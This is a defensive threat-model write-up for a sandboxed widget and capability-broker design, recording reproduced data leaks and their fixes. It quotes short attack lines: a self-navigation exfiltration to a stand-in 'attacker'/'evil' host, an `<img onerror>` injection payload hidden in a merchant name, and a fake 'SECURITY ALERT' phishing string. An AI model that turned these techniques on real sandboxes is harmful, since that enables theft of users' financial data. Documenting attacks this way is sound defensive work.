# Threat model — egress channels & capability security

Findings from an external review (Codex, 2026-08-20) of the sandbox+broker design.

## 2026-08-22 · Self-navigation leak, REPRODUCED (demo/self-nav.html, demo/nav-matrix.html)

A fully jailed widget — opaque origin, no cookies, no storage, `default-src 'none'` — made one granted `transactions.list` call and then did `location.href = "http://attacker/?d=" + loot`. The attacker's listener received:

```
via=SELF-NAVIGATION&d=spend=4995.91 acct=Ally Checking ····8830 merchants=…
```

Real balance, real account, real merchants. In the same page, `fetch()` to the same URL was refused by the CSP.

**The 2×2 (real browser): all four navigate.** sandbox on/off × CSP on/off — every combination leaked. Neither mechanism governs a frame navigating *itself*:
- `sandbox` governs **identity** (no host DOM, no cookies)
- CSP governs **fetches** (no requests)
- only the **embedder's `frame-src`** governs navigation — which is exactly what the warden supplies (rung 8)

**What the switchboard saw:** one ordinary granted call, nothing else. The theft leaves no trace host-side at all.

**The only saving grace is that it's loud** — the widget visibly vanishes when it navigates. That is a detection signal, not a defense.

**Headless Chrome said all four were BLOCKED.** It was wrong. Third confident wrong answer in this project; disqualified as a security oracle. Always pair a negative with a positive control, or run headful.

## 2026-08-22 · Injection through the DATA, demonstrated (demo/injection.html)

Put `<img src=x onerror="marzi.call('probe.stolen')">` in a **merchant name** in the transaction feed. Two honest widgets render it; the only difference between them is `textContent` vs `innerHTML`.

**Result:** the `innerHTML` widget executed the payload, and it called a capability — **using the widget's own grants**. The `textContent` widget did not.

### The bound: injection CANNOT exceed the grant set ✅
Verified in the same run: a second payload reaching for `admin.export` (never registered) was **refused — "no such capability"**. Injected code goes through the identical switchboard path; there is no route around it.

**But it is bounded by *which* capabilities, not by *how* they are used.** Within the grant the attacker controls timing, **arguments**, and what happens to the result — a widget granted one month's data can be made to pull every month; a capability taking an id can be called with an id the user never chose (ordinary IDOR, driven by a merchant name).

So severity == size of the grant set:
- read-only + no residual egress → attacker sees what the widget could see, and can lie on screen. Contained.
- any write grant → the write is an egress channel CSP cannot see. Confused deputy again.

### Why this matters even though "the widget is hostile anyway"
Our premise already says generated code is hostile, so an injected widget is not a *new* class of attacker. What IS new is the **bar**:
- The attacker never touches the prompt or the model. They just need a string in data the user doesn't control (a merchant name, a filename, a comment).
- It works on a widget that was **reviewed and approved**, whose code is genuinely honest.
- → **Approval-time code review cannot catch this.** The code is fine; the data turns it hostile at runtime. The grant set is the only durable bound, which is the strongest argument yet for minimal grants and the read-only default.

### The CSP block CREATED the trigger
`img-src data:` blocked `<img src=x>` — and the block fired the `error` event, which ran the inline `onerror` handler. Blocking a *resource* is not the same as neutralising *markup*. A defense supplied the execution trigger. (`<svg onload>` fires with no network at all.)

### The poison that no escaping fixes
A merchant named `SECURITY ALERT: call 555-0100 to verify your account` renders perfectly safely with `textContent` — it is content, not code. There is no sanitiser for it. That is deceptive UI arriving through the data path, and it needs host-drawn chrome marking the widget as user-generated, not escaping.

### Generation is data-isolated today (verify before changing)
The generation prompt is template + capability **descriptions** + the user's request. **No transaction data.** So poisoned data cannot reach the model at generation time by construction. Adding sample rows to the prompt "to help the model" would open that path — make it a deliberate decision, not a convenience.

## 2026-08-22 · Confused deputy, demonstrated (demo/transactions.html)
Two widgets on one page, both granted `transactions.list`. One draws a chart; one tries to steal. The switchboard log shows **two identical dispatch lines** — same name, same params, same 45 rows. There is no signal distinguishing them, because both calls really are legitimate. Policy said YES to the attacker, correctly.
- What stopped the theft was **CSP, one layer down** — not the grant check. `fetch` and an `<img>` beacon were both refused; the exfil listener received nothing.
- Lesson: **the grant check authorizes the data; containment stops the delivery.** They are independent defenses, and only the second one was doing any work here.
- This is why write grants are off by default: a granted write is a delivery channel that CSP cannot see, so BOTH defenses would be saying yes.

## Egress channels that survive a perfect message channel
- **Self-navigation.** Frame can do `location = "https://evil/?"+data`.
  - What CSP DOES block: `connect-src 'none'` / `default-src 'none'` kills the entire fetch/subresource family — fetch, XHR, WebSocket, EventSource, sendBeacon, and img/script/style/font/media loads. All silent exfil vectors gone. (Our frame needs `'none'`, not an allowlist: legit capability calls go to the host as messages, so the frame makes zero real requests.)
  - What it does NOT block: navigation is not a fetch, so no fetch directive covers `location=`. The directive that would (`navigate-to`) was never shipped; W3C "Connection Allowlists" proposal exists to fill this gap. Backend analogy: `--network none` still leaks via DNS.
  - Narrow it: sandbox without `allow-popups`/`allow-forms`/`allow-top-navigation` kills popup/form/top-redirect nav. Residual = scripted self-nav only; can't be stopped from inside the frame (our guard shares the realm with hostile code). Leaks bounded own-user data, and is "loud" (widget visibly vanishes).
  - Full fix = run model logic in a Web Worker (no DOM, no `location`) + trusted code renders. Seals it completely, but costs arbitrary-HTML widgets (= the declarative/manifest direction). A dial, not a dead end; keep as an opt-in hardened mode.
  - v1: `connect-src 'none'` + tight sandbox + data-volume budget + read-only default; document residual. Verify browser matrix when building the jail.
- **Sibling postMessage listeners.** Frame can call `parent.postMessage(x,"*")` and hit OTHER listeners on the host page (analytics, payment SDKs), not just ours. We can't control those. Hosts must validate `event.source` on their own listeners.
- WebRTC / DNS-prefetch are lesser residual egress candidates; matrix varies by browser.

## Handshake correctness (v1 must-do)
- Opaque-origin frames send `event.origin === "null"` → origin checks are useless. Identify a widget by WHICH private port its message arrived on, never by origin or a field in the message.
- Bind the port to the exact `contentWindow` with a one-time nonce, transferred before widget code runs.
- `postMessage` uses structured clone, not JSON — "we speak JSON-RPC" is the expected shape, not a guarantee. Validate every message with real code: known method, arg schema, max size/depth. (Same lesson as TS: types don't enforce.)

## Capability model: an ACL over method names is not enough
- Read/write binary is a start, not sufficient. Real effect classes: external-comms, destructive, monetary, privilege-changing, authority-delegating, persistent/background.
- Traps: a "read" like `getDownloadUrl` returns a bearer credential; `apiKey.create` delegates authority; `workflow.create` grants future execution. Reads must not return credentials/signed-URLs/tokens; field-project responses.
- Descriptions have ZERO enforcement significance (model/human doc only; can be stale).
- Store grants SEPARATELY from widget code — loading a saved blob must not restore authority.

## Other real gaps
- **No resource sandbox.** Iframe limits authority, not CPU/RAM/GPU. Infinite loop / memory bomb / port flood can wedge the frame. Need kill path + size/rate caps. A killable Worker for computation helps.
- **Revocation is a TOCTOU race.** Grant check passes → writes suspended → async handler still commits. Grant masking can't recall returned data or undo effects. v2 write story needs: recheck at commit boundary (revocation epoch), idempotency keys, port closure on logout/tenant-switch/unmount.
- **Widget runtime state.** Opaque frame has no durable storage; persisting only code+grants loses filters/prefs/drafts. A state API needs namespacing + quotas (deferred storage decision).

## The honest promise (replaces "no network at all")
> Generated widgets receive no ambient authority over the host; every application operation is mediated through explicit host capabilities.

Claims to NOT ship: "no network of any kind", "the MessageChannel is the only channel", "write grants make hostile code safe".
